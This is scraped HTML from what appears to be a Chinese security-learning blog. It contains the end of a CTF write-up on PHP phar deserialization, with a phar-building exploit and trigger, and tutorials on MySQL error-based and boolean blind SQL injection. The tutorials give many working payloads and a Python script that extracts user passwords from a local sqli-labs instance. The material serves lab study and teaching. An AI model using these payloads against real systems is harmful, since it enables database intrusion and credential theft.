align=\&quot;center\&quot;&gt;You can&#x27;t upload this kind of file!&lt;/p&gt;&quot;);</span></span><br><span class="line"><span class="meta">		&#125; </span></span><br><span class="line"><span class="meta">		$upload_file = $name;</span></span><br><span class="line"><span class="meta">		move_uploaded_file($tmp_name, $upload_file);</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">		if(file_exists($name)) &#123;</span></span><br><span class="line"><span class="meta">			echo &quot;&lt;p align=\&quot;center\&quot;&gt;Your file $name has been uploaded.&lt;br&gt;&lt;/p&gt;&quot;;</span></span><br><span class="line"><span class="meta">		&#125; else &#123;</span></span><br><span class="line"><span class="meta">			echo &#x27;&lt;script&gt;alert(&quot;上传失败&quot;)&lt;/script&gt;&#x27;;</span></span><br><span class="line"><span class="meta">		&#125;</span></span><br><span class="line"><span class="meta">		echo &quot;&lt;p align=\&quot;center\&quot;&gt;&lt;a href=\&quot;view.php\&quot; &gt;点我去看上传的文件&lt;/a&gt;&lt;/p&gt;&quot;;</span></span><br><span class="line"><span class="meta">		#header(&quot;refresh:3;url=index.php&quot;);</span></span><br><span class="line"><span class="meta">	&#125;</span></span><br><span class="line"><span class="meta"> ?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">View</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dir</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span> = <span class="string">&#x27;show_source(&quot;flag.php&quot;);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);  </span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>); </span><br><span class="line"><span class="variable">$object</span> = <span class="keyword">new</span> <span class="title class_">View</span>();  </span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setMetadata</span>(<span class="variable">$object</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后本地运行得到phar.phar</p>
<p>然后post方式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete=phar://aaa.phar</span><br></pre></td></tr></table></figure>

<p>触发file_exists</p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HSCSEC/" rel="tag">HSCSEC</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-报错注入"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/02/02/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"
    >报错注入</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/02/02/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" class="article-date">
  <time datetime="2023-02-02T08:59:42.000Z" itemprop="datePublished">2023-02-02</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/Web/">Web</a> / <a class="article-category-link" href="/categories/Web/Sql/">Sql</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h3 id="1-报错注入的介绍"><a href="#1-报错注入的介绍" class="headerlink" title="1.报错注入的介绍"></a>1.报错注入的介绍</h3><p>SQL报错注入就是利用数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。这种手段在联合查询受限且能返回错误信息的情况下比较好用。</p>
<h4 id="报错注入分类"><a href="#报错注入分类" class="headerlink" title="报错注入分类"></a>报错注入分类</h4><p>MySQL的报错注入主要是利用MySQL的一些逻辑漏洞，根据漏洞原因的不同，可以将MySQL报错注入 分为以下几类：</p>
<ul>
<li>BigInt等数据类型溢出   <a target="_blank" rel="noopener" href="https://www.cnblogs.com/lcamry/articles/5509112.html"></a></li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">!</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">user</span>())x)</span><br></pre></td></tr></table></figure>

<ul>
<li><p>xpath语法错误    xpath报错最多只能报出32位字符  所以要使用字符截取函数</p>
</li>
<li><p>count()+rand()+group_by()导致主键重复 </p>
</li>
<li><p>空间数据类型函数错误</p>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,2,3 from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x--+</span></span><br></pre></td></tr></table></figure>



<h3 id="2-报错注入的攻击流程"><a href="#2-报错注入的攻击流程" class="headerlink" title="2.报错注入的攻击流程"></a>2.报错注入的攻击流程</h3><h4 id="1-判断注入类型"><a href="#1-判断注入类型" class="headerlink" title="1.判断注入类型"></a>1.判断注入类型</h4><p>先判断是字符型还是数字型</p>
<h4 id="2-获取数据库名称"><a href="#2-获取数据库名称" class="headerlink" title="2.获取数据库名称"></a>2.获取数据库名称</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1)%23</span></span><br></pre></td></tr></table></figure>

<h4 id="3-获取数据库表名"><a href="#3-获取数据库表名" class="headerlink" title="3.获取数据库表名"></a>3.获取数据库表名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;),0x7e),1)%23</span></span><br></pre></td></tr></table></figure>

<h4 id="4-获取字段名"><a href="#4-获取字段名" class="headerlink" title="4.获取字段名"></a>4.获取字段名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; and table_schema=&#x27;</span>security<span class="string">&#x27;),0x7e),1)%23</span></span><br></pre></td></tr></table></figure>

<p> union select (exp(~(select * FROM(SELECT USER())a))),2, 3–+</p>
<h4 id="5-获取字段内容"><a href="#5-获取字段内容" class="headerlink" title="5.获取字段内容"></a>5.获取字段内容</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select group_concat(id,username,password) from users),0x7e),1)%23</span></span><br></pre></td></tr></table></figure>



<h3 id="3-报错注入的一些函数"><a href="#3-报错注入的一些函数" class="headerlink" title="3.报错注入的一些函数"></a>3.报错注入的一些函数</h3><h4 id="1-Updatexml"><a href="#1-Updatexml" class="headerlink" title="1.Updatexml()"></a>1.Updatexml()</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">函数语法：updatexml(XML_document, XPath_string, </span><br><span class="line">new_value);</span><br><span class="line">适用版本: 5.1.5+</span><br><span class="line">我们通常在第二个xpath参数填写我们要查询的内容。</span><br><span class="line">updatexml是由于参数的格式不正确而产生的错误，同样也会返回参数 的信息。</span><br><span class="line">payload: updatexml(1,concat(0x7e,(select user()),0x7e),1)</span><br><span class="line">前后添加~使其不符合xpath格式从而报错。</span><br></pre></td></tr></table></figure>

<h4 id="2-extractvalue"><a href="#2-extractvalue" class="headerlink" title="2.extractvalue()"></a>2.extractvalue()</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">函数语法：EXTRACTVALUE (XML_document, XPath_string);</span><br><span class="line">适用版本：5.1.5+</span><br><span class="line">利用原理与updatexml函数相同</span><br><span class="line">payload: extractvalue(1,concat(0x7e,(select user()),0x7e))</span><br></pre></td></tr></table></figure>

<h4 id="3-floor"><a href="#3-floor" class="headerlink" title="3.floor()"></a>3.floor()</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> concat(version(), <span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>)) </span><br></pre></td></tr></table></figure>

<p>如果关键的表被禁用了，可以使用这种形式 </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">!</span><span class="number">1</span>) <span class="keyword">group</span> <span class="keyword">by</span> concat(version(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>)) </span><br></pre></td></tr></table></figure>

<p>如果 rand 被禁用了可以使用用户变量来报错 </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">min</span>(<span class="variable">@a</span>:<span class="operator">=</span><span class="number">1</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> concat(password,<span class="variable">@a</span>:<span class="operator">=</span>(<span class="variable">@a</span><span class="operator">+</span><span class="number">1</span>)<span class="operator">%</span><span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<h4 id="4-exp"><a href="#4-exp" class="headerlink" title="4.exp"></a>4.exp</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lcamry/articles/5509124.html">exp</a></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> <span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> database())x))</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> <span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> <span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>)x))</span><br></pre></td></tr></table></figure>

<h4 id="5-geometrycollection"><a href="#5-geometrycollection" class="headerlink" title="5.geometrycollection()"></a>5.geometrycollection()</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id <span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> geometrycollection((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span> database())a)b))</span><br></pre></td></tr></table></figure>

<h4 id="6-multipoint"><a href="#6-multipoint" class="headerlink" title="6.multipoint()"></a>6.multipoint()</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> multipoint((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span> database())a)b))</span><br></pre></td></tr></table></figure>

<h4 id="7-polygon"><a href="#7-polygon" class="headerlink" title="7.polygon"></a>7.polygon</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> polygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span> database())a)b))</span><br></pre></td></tr></table></figure>

<h4 id="8-multipolygon"><a href="#8-multipolygon" class="headerlink" title="8.multipolygon"></a>8.multipolygon</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> multipolygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span> database())a)b))</span><br></pre></td></tr></table></figure>

<h4 id="9-linestring"><a href="#9-linestring" class="headerlink" title="9.linestring"></a>9.linestring</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> linestring((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span> database())a)b))</span><br></pre></td></tr></table></figure>

<h4 id="10-multilinestring"><a href="#10-multilinestring" class="headerlink" title="10.multilinestring"></a>10.multilinestring</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> multilinestring((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span> database())a)b))</span><br></pre></td></tr></table></figure>

 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" rel="tag">报错注入</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-盲注"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/02/02/%E7%9B%B2%E6%B3%A8/"
    >盲注</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/02/02/%E7%9B%B2%E6%B3%A8/" class="article-date">
  <time datetime="2023-02-02T08:55:52.000Z" itemprop="datePublished">2023-02-02</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/Web/">Web</a> / <a class="article-category-link" href="/categories/Web/Sql/">Sql</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><h4 id="1-布尔盲注的判断"><a href="#1-布尔盲注的判断" class="headerlink" title="1.布尔盲注的判断"></a>1.布尔盲注的判断</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">布尔状态例如：</span><br><span class="line">1.回显不同（内容、长度）</span><br><span class="line">2.HTTP响应状态码不同（200、500）</span><br><span class="line">3.HTTP响应头变化（无条件重定向、设置cookie）</span><br><span class="line">4.基于错误的布尔注入（MySQL是否报错）</span><br></pre></td></tr></table></figure>

<p>有些时候很多东西都被过滤了，如果一个一个的尝试的话会非常麻烦并且费时费力，可以尝试FUZZ黑名单过滤，利用burpsuite   intruder模块</p>
<p>先传入一个参数然后抓包，加一个变量利用intruder模块爆破sql语句关键字就可以了</p>
<h4 id="2-布尔盲注攻击流程"><a href="#2-布尔盲注攻击流程" class="headerlink" title="2.布尔盲注攻击流程"></a>2.布尔盲注攻击流程</h4><h5 id="1-判断是否存在注入"><a href="#1-判断是否存在注入" class="headerlink" title="1.判断是否存在注入"></a>1.判断是否存在注入</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">第一步：正常查询，返回True（语句执行成功）或者返回False（语句执行成功没有查询到内容）。</span><br><span class="line">第二步：输入引号进行看页面变化，页面返回False，可能存在漏洞，也可能没有查询到内容。</span><br><span class="line">第三步：利用and进行判断，比如：1 and 1=1和1 and 1=2，1’ and 1=1#和1’ and 1=2#，如果前者执</span><br><span class="line">行的结果不一样，说明是数字型的布尔盲注；如果后者执行的结果不一样，说明是字符型的布尔盲注。</span><br></pre></td></tr></table></figure>



<h5 id="2-获取数据库长度"><a href="#2-获取数据库长度" class="headerlink" title="2.获取数据库长度"></a>2.获取数据库长度</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">因为无法通过页面数据回显获取数据，所以只能靠判断对错的方式来获取数据，可以使用MySQL中的内</span><br><span class="line">置函数获取字符串长度：</span><br><span class="line">length() ：单位是字节，utf8编码下,一个汉字三个字节，一个数字或字母一个字节。gbk编码下,一</span><br><span class="line">个汉字两个字节，一个数字或字母一个字节。</span><br><span class="line"><span class="keyword">char_length</span>()：单位为字符，不管汉字还是数字或者是字母都算是一个字符。</span><br><span class="line">比如：</span><br><span class="line"><span class="keyword">select</span> length(database()); </span><br><span class="line"><span class="keyword">select</span> length(database())<span class="operator">=</span><span class="number">8</span>;   #利用这种方式赋值  当赋值正确时会返回正确也可以通过脚本来爆破</span><br></pre></td></tr></table></figure>



<h5 id="3-逐字猜解数据库名"><a href="#3-逐字猜解数据库名" class="headerlink" title="3.逐字猜解数据库名"></a>3.逐字猜解数据库名</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在获取数据库名的时候注意数据库的命名规则，他是采用26个英文字母(区分大小写)和0-9的自然数(经常</span><br><span class="line">不需要)加上下划线&#x27;_&#x27;组成，命名简洁明确，多个单词用下划线&#x27;_&#x27;分隔。</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">利用substr字符串截取函数来逐个判断</span><br><span class="line">substr(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;s&#x27;</span></span><br><span class="line">如果substr函数被过滤可以使用  mid()函数来替代</span><br><span class="line">也可以把截取的东西转化为ASCII值来判断</span><br><span class="line">ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span></span><br><span class="line">爆破过程可以利用burpsuite   intruder  模块进行爆破</span><br><span class="line">过滤了逗号怎么办？就不能多个参数了吗？利用   <span class="keyword">from</span>   和    <span class="keyword">for</span>  代替</span><br><span class="line"><span class="keyword">SELECT</span> SUBSTR(<span class="string">&#x27;2018-08-17&#x27;</span>,<span class="number">6</span>,<span class="number">5</span>);与<span class="keyword">SELECT</span> SUBSTR(<span class="string">&#x27;2018-08-17&#x27;</span> <span class="keyword">FROM</span> <span class="number">6</span> <span class="keyword">FOR</span> <span class="number">5</span>)</span><br></pre></td></tr></table></figure>

<h5 id="4-逐字猜解数据库的表名"><a href="#4-逐字猜解数据库的表名" class="headerlink" title="4.逐字猜解数据库的表名"></a>4.逐字猜解数据库的表名</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii(substr(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>



<h5 id="5-逐字猜解字段名"><a href="#5-逐字猜解字段名" class="headerlink" title="5.逐字猜解字段名"></a>5.逐字猜解字段名</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii(substr(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;&#x27;</span>,<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>



<h5 id="6-逐字猜解记录数据"><a href="#6-逐字猜解记录数据" class="headerlink" title="6.逐字猜解记录数据"></a>6.逐字猜解记录数据</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii(substr(<span class="keyword">select</span> group_concat(字段名) <span class="keyword">from</span> 表名))</span><br></pre></td></tr></table></figure>



<h4 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#还可以采用python脚本的形式来进行爆破</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1/sqli/Less-5/&#x27;</span></span><br><span class="line"><span class="comment"># select = &#x27;select database()&#x27;     #数据库  security</span></span><br><span class="line"><span class="comment"># select = &#x27;select group_concat(table_name) from information_schema.tables where table_schema=database()&#x27;    #表名  emails,referers,uagents,users</span></span><br><span class="line"><span class="comment"># select  = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;&quot;   #字段名  user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password</span></span><br><span class="line">select = <span class="string">&quot;select group_concat(password) from users&quot;</span>     <span class="comment">#字段内容</span></span><br><span class="line">result=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">126</span>):</span><br><span class="line">        payload = <span class="string">f&quot;-1&#x27; or ord(substr((<span class="subst">&#123;select&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>--+&quot;</span></span><br><span class="line">        r = requests.get(url=url+<span class="string">&#x27;?id=&#x27;</span>+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;You are&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            result+=<span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> j==<span class="number">125</span>:</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="3-布尔盲注的一些函数"><a href="#3-布尔盲注的一些函数" class="headerlink" title="3.布尔盲注的一些函数"></a>3.布尔盲注的一些函数</h4><h5 id="1-substr-函数"><a href="#1-substr-函数" class="headerlink" title="1.substr()函数"></a>1.substr()函数</h5><p>substr(str,pos,len)   表示截取字符串str  从pos这位置截取len个字符</p>
<p>如果过滤了逗号</p>
<p>SELECT SUBSTR(‘2018-08-17’ FROM 6 FOR 5);</p>
<h5 id="2-mid"><a href="#2-mid" class="headerlink" title="2.mid()"></a>2.mid()</h5><p>mid(str,pos,len)    表示截取字符串str  从pos这位置截取len个字符  用法与substr类似</p>
<h5 id="3-right-函数"><a href="#3-right-函数" class="headerlink" title="3.right()函数"></a>3.right()函数</h5><p>right(str,len)    表示从字符串的最右面截取len个字符</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">技巧是结合ascii()</span><br><span class="line">ascii(‘str’) 返回字符串的第一个字符的ascii码 能用ascii时尽量用ascii! 因为字符的比较可能因为字符比较特殊(比如是单引号)而出现很多问题，但是ascii</span><br><span class="line">直接转成数字，就解决了这个问题！</span><br><span class="line">ascii的同名函数是ord 用于过滤ascii的过滤</span><br></pre></td></tr></table></figure>

<h5 id="4-trim-函数"><a href="#4-trim-函数" class="headerlink" title="4.trim()函数"></a>4.trim()函数</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SQL trim() 函数 过滤指定的字符串,最常见的用途是移除字首或字尾的空白。</span><br><span class="line">MySQL: TRIM( ), RTRIM( ), LTRIM( )</span><br><span class="line">TRIM() #删除前后空格</span><br><span class="line">RTRIM() #删除字符串结尾空格</span><br><span class="line">LTRIM() #删除字符串起始空格</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TRIM([BOTH/LEADING/TRAILING] 目标字符串 FROM 源字符串）</span><br><span class="line">如果=用regexp替代 那么正确的字符一定在regexp前面 以这个abcd为例</span><br><span class="line">Trim(leading ‘a’ from ‘abcd’) regexp trim(LEADING ‘x’ from ‘abcd’)</span><br><span class="line">就是bcd regexp abcd返回0， 如果反过来就是abcd regexp bcd 返回1</span><br></pre></td></tr></table></figure>

<h5 id="5-insert"><a href="#5-insert" class="headerlink" title="5.insert()"></a>5.insert()</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Insert(字符串，起始位置，长度，替换为什么)</span><br><span class="line">abc从第一位也就是a开始后的两位(ab)替换为xx</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2023/02/02/%E7%9B%B2%E6%B3%A8/1662302958057.png" alt="1662302958057"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">insert</span>((<span class="keyword">insert</span>(<span class="string">&#x27;abcdef&#x27;</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)),<span class="number">2</span>,<span class="number">99999</span>,<span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/2023/02/02/%E7%9B%B2%E6%B3%A8/1662303054792.png" alt="1662303054792"></p>
